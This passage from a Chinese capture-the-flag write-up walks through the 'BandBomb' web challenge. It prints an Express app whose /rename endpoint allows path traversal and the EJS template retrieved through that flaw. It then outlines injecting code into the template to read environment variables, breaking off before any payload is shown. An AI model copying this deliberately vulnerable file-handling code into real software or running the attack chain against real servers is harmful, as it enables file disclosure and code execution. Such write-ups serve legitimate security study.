BandBomb</h3><p>题目给出的app.js源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> storage = multer.<span class="title function_">diskStorage</span>(&#123;</span><br><span class="line">  <span class="attr">destination</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> uploadDir = <span class="string">&#x27;uploads&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadDir)) &#123;</span><br><span class="line">      fs.<span class="title function_">mkdirSync</span>(uploadDir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, uploadDir);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">filename</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, file.<span class="property">originalname</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; </span><br><span class="line">  <span class="attr">storage</span>: storage,</span><br><span class="line">  <span class="attr">fileFilter</span>: <span class="function">(<span class="params">_, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!file.<span class="property">originalname</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;无效的文件名&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;文件处理错误&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> uploadsDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadsDir)) &#123;</span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(uploadsDir);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">readdir</span>(uploadsDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: [] &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  upload.<span class="title function_">single</span>(<span class="string">&#x27;file&#x27;</span>)(req, res, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">file</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;没有选择文件&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; </span><br><span class="line">      <span class="attr">message</span>: <span class="string">&#x27;文件上传成功&#x27;</span>,</span><br><span class="line">      <span class="attr">filename</span>: req.<span class="property">file</span>.<span class="property">filename</span> </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/rename&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; oldName, newName &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">const</span> oldPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, oldName);</span><br><span class="line">  <span class="keyword">const</span> newPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, newName);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!oldName || !newName) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">rename</span>(oldPath, newPath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> + err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`服务器运行在 http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不难发现rename处存在目录穿越，而且可以通过访问/static/xxx来将对应的文件下载下来，因此我们只要利用漏洞穿越将想查看的文件放到public文件夹中即可</p><figure><img src="/images/HGame2025-Writeup/image-20250206200825198.png"alt="image-20250206200825198" /><figcaption aria-hidden="true">image-20250206200825198</figcaption></figure><p>访问/static/1.ejs得到mortis.ejs：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Ave Mujica&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        :root &#123;</span><br><span class="line">            --bg-color: #1a1a1a;</span><br><span class="line">            --text-color: #e0e0e0;</span><br><span class="line">            --accent-color: #ff4444;</span><br><span class="line">            --border-color: #333;</span><br><span class="line">            --hover-color: #2a2a2a;</span><br><span class="line">            --button-bg: #ff4444;</span><br><span class="line">            --button-hover: #ff6666;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        body &#123; </span><br><span class="line">            padding: 20px;</span><br><span class="line">            margin: 0;</span><br><span class="line">            font-family: &#x27;Segoe UI&#x27;, Arial, sans-serif;</span><br><span class="line">            background-color: var(--bg-color);</span><br><span class="line">            color: var(--text-color);</span><br><span class="line">            min-height: 100vh;</span><br><span class="line">            background-image: url(&#x27;/static/UmiTaki.webp&#x27;);</span><br><span class="line">            background-size: cover;</span><br><span class="line">            background-position: center;</span><br><span class="line">            background-attachment: fixed;</span><br><span class="line">            position: relative;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        body::before &#123;</span><br><span class="line">            content: &#x27;&#x27;;</span><br><span class="line">            position: fixed;</span><br><span class="line">            top: 0;</span><br><span class="line">            left: 0;</span><br><span class="line">            right: 0;</span><br><span class="line">            bottom: 0;</span><br><span class="line">            background: rgba(26, 26, 26, 0.85);</span><br><span class="line">            z-index: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .container &#123;</span><br><span class="line">            max-width: 800px;</span><br><span class="line">            margin: 0 auto;</span><br><span class="line">            padding: 20px;</span><br><span class="line">            position: relative;</span><br><span class="line">            z-index: 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        h2 &#123;</span><br><span class="line">            color: var(--accent-color);</span><br><span class="line">            font-size: 2em;</span><br><span class="line">            margin-bottom: 1.5em;</span><br><span class="line">            text-transform: uppercase;</span><br><span class="line">            letter-spacing: 2px;</span><br><span class="line">            text-align: center;</span><br><span class="line">            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .upload-section &#123;</span><br><span class="line">            padding: 2em;</span><br><span class="line">            margin-bottom: 2em;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .upload-form &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            align-items: center;</span><br><span class="line">            gap: 20px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-input-container &#123;</span><br><span class="line">            position: relative;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        input[type=&quot;file&quot;] &#123;</span><br><span class="line">            display: none;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-input-label &#123;</span><br><span class="line">            display: inline-block;</span><br><span class="line">            padding: 12px 24px;</span><br><span class="line">            color: white;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            text-transform: uppercase;</span><br><span class="line">            letter-spacing: 1px;</span><br><span class="line">            font-size: 0.9em;</span><br><span class="line">            white-space: nowrap;</span><br><span class="line">            background-color: var(--accent-color);</span><br><span class="line">            border-radius: 8px;</span><br><span class="line">            box-shadow: 0 4px 15px rgba(255, 68, 68, 0.3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        button[type=&quot;submit&quot;] &#123;</span><br><span class="line">            color: white;</span><br><span class="line">            border: none;</span><br><span class="line">            padding: 12px 24px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            text-transform: uppercase;</span><br><span class="line">            letter-spacing: 1px;</span><br><span class="line">            font-size: 0.9em;</span><br><span class="line">            white-space: nowrap;</span><br><span class="line">            background-color: var(--accent-color);</span><br><span class="line">            border-radius: 8px;</span><br><span class="line">            box-shadow: 0 4px 15px rgba(255, 68, 68, 0.3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .meme-section &#123;</span><br><span class="line">            padding: 2em;</span><br><span class="line">            margin-bottom: 2em;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-list &#123;</span><br><span class="line">            margin-bottom: 2em;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-item &#123;</span><br><span class="line">            margin: 10px 0;</span><br><span class="line">            padding: 15px 20px;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            transition: all 0.3s ease;</span><br><span class="line">            border: 2px solid var(--accent-color);</span><br><span class="line">            background: transparent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-item:hover &#123;</span><br><span class="line">            background: var(--accent-color);</span><br><span class="line">            transform: translateX(5px);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-name &#123;</span><br><span class="line">            font-size: 1.1em;</span><br><span class="line">            color: var(--text-color);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .meme-image &#123;</span><br><span class="line">            max-width: 200px;</span><br><span class="line">            transition: transform 0.3s ease;</span><br><span class="line">            margin-top: 2em;</span><br><span class="line">            border-radius: 10px;</span><br><span class="line">            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .meme-image:hover &#123;</span><br><span class="line">            transform: scale(1.05);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .selected-file-name &#123;</span><br><span class="line">            position: absolute;</span><br><span class="line">            bottom: -25px;</span><br><span class="line">            left: 50%;</span><br><span class="line">            transform: translateX(-50%);</span><br><span class="line">            color: var(--accent-color);</span><br><span class="line">            font-size: 0.9em;</span><br><span class="line">            white-space: nowrap;</span><br><span class="line">            max-width: 200px;</span><br><span class="line">            overflow: hidden;</span><br><span class="line">            text-overflow: ellipsis;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @keyframes fadeIn &#123;</span><br><span class="line">            from &#123; opacity: 0; transform: translateY(20px); &#125;</span><br><span class="line">            to &#123; opacity: 1; transform: translateY(0); &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-item &#123;</span><br><span class="line">            animation: fadeIn 0.5s ease forwards;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;h2&gt;Ave Mujica ! ! ! !!&lt;/h2&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;div class=&quot;upload-section&quot;&gt;</span><br><span class="line">            &lt;form id=&quot;uploadForm&quot; class=&quot;upload-form&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;file-input-container&quot;&gt;</span><br><span class="line">                    &lt;label class=&quot;file-input-label&quot; for=&quot;fileInput&quot;&gt;</span><br><span class="line">                        选择文件</span><br><span class="line">                    &lt;/label&gt;</span><br><span class="line">                    &lt;input id=&quot;fileInput&quot; type=&quot;file&quot; name=&quot;file&quot; required&gt;</span><br><span class="line">                    &lt;div id=&quot;selectedFileName&quot; class=&quot;selected-file-name&quot;&gt;&lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;button type=&quot;submit&quot;&gt;上传文件&lt;/button&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;meme-section&quot;&gt;</span><br><span class="line">            &lt;div id=&quot;fileList&quot; class=&quot;file-list&quot;&gt;</span><br><span class="line">                &lt;% if (files &amp;&amp; files.length &gt; 0) &#123; %&gt;</span><br><span class="line">                    &lt;% files.forEach(function(file) &#123; %&gt;</span><br><span class="line">                        &lt;div class=&quot;file-item&quot;&gt;</span><br><span class="line">                            &lt;span class=&quot;file-name&quot;&gt;&lt;%= file %&gt;&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;% &#125;); %&gt;</span><br><span class="line">                &lt;% &#125; else &#123; %&gt;</span><br><span class="line">                    &lt;p style=&quot;text-align: center; color: rgba(255,255,255,0.5);&quot;&gt;我们的乐队蒸蒸日上&lt;/p&gt;</span><br><span class="line">                    &lt;p style=&quot;display: none;&quot;&gt;只是UmiTaki而已&lt;/p&gt;</span><br><span class="line">                &lt;% &#125; %&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;img src=&quot;/static/Eruption.jpg&quot; alt=&quot;表情包&quot; class=&quot;meme-image&quot;&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        // 显示选择的文件名</span><br><span class="line">        document.getElementById(&#x27;fileInput&#x27;).addEventListener(&#x27;change&#x27;, function(e) &#123;</span><br><span class="line">            const fileName = e.target.files[0]?.name || &#x27;&#x27;;</span><br><span class="line">            document.getElementById(&#x27;selectedFileName&#x27;).textContent = fileName;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        // 上传文件</span><br><span class="line">        document.getElementById(&#x27;uploadForm&#x27;).onsubmit = async (e) =&gt; &#123;</span><br><span class="line">            e.preventDefault();</span><br><span class="line">            const formData = new FormData(e.target);</span><br><span class="line">            </span><br><span class="line">            try &#123;</span><br><span class="line">                const response = await fetch(&#x27;/upload&#x27;, &#123;</span><br><span class="line">                    method: &#x27;POST&#x27;,</span><br><span class="line">                    body: formData</span><br><span class="line">                &#125;);</span><br><span class="line">                const result = await response.json();</span><br><span class="line">                if (result.error) &#123;</span><br><span class="line">                    alert(result.error);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    alert(result.message);</span><br><span class="line">                    window.location.reload();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (err) &#123;</span><br><span class="line">                alert(&#x27;上传失败: &#x27; + err.message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>试了下发现常见的地方都找不到flag，那么flag应该是在环境变量中，给这个ejs加点料进去再传回去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span 